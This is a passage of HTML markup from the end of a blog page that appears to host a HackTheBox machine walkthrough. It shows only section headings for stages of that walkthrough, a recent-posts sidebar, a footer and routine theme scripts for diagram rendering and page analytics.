class="toc-text">Nmap scan</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CuteNews"><span class="toc-number">3.</span> <span class="toc-text">CuteNews</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CuteNews-2-1-2-Remote-Code-Execution"><span class="toc-number">4.</span> <span class="toc-text">CuteNews 2.1.2 - Remote Code Execution</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-User-Paul"><span class="toc-number">5.</span> <span class="toc-text">Getting User Paul</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilage-Escalation"><span class="toc-number">6.</span> <span class="toc-text">Privilage Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-User-nadav"><span class="toc-number">6.1.</span> <span class="toc-text">Getting User nadav</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Root"><span class="toc-number">7.</span> <span class="toc-text">Getting Root</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-dog-walkthrough/" title="HackTheBox - Dog Walkthrough">HackTheBox - Dog Walkthrough</a><time datetime="2025-05-07T13:00:00.000Z" title="Created 2025-05-07 18:30:00">2025-05-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-jerry-walkthrough/" title="HackTheBox - Jerry Walkthrough">HackTheBox - Jerry Walkthrough</a><time datetime="2023-09-13T18:30:00.000Z" title="Created 2023-09-14 00:00:00">2023-09-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-bounty-walkthrough/" title="HackTheBox - Bounty Walkthrough">HackTheBox - Bounty Walkthrough</a><time datetime="2023-09-12T18:30:00.000Z" title="Created 2023-09-13 00:00:00">2023-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-arctic-walkthrough/" title="HackTheBox - Arctic Walkthrough">HackTheBox - Arctic Walkthrough</a><time datetime="2023-09-12T18:30:00.000Z" title="Created 2023-09-13 00:00:00">2023-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/HackTheBox-Granny-Walkthrough/" title="HackTheBox - Granny Walkthrough">HackTheBox - Granny Walkthrough</a><time datetime="2023-09-11T18:30:00.000Z" title="Created 2023-09-12 00:00:00">2023-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By mdn1nj4</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>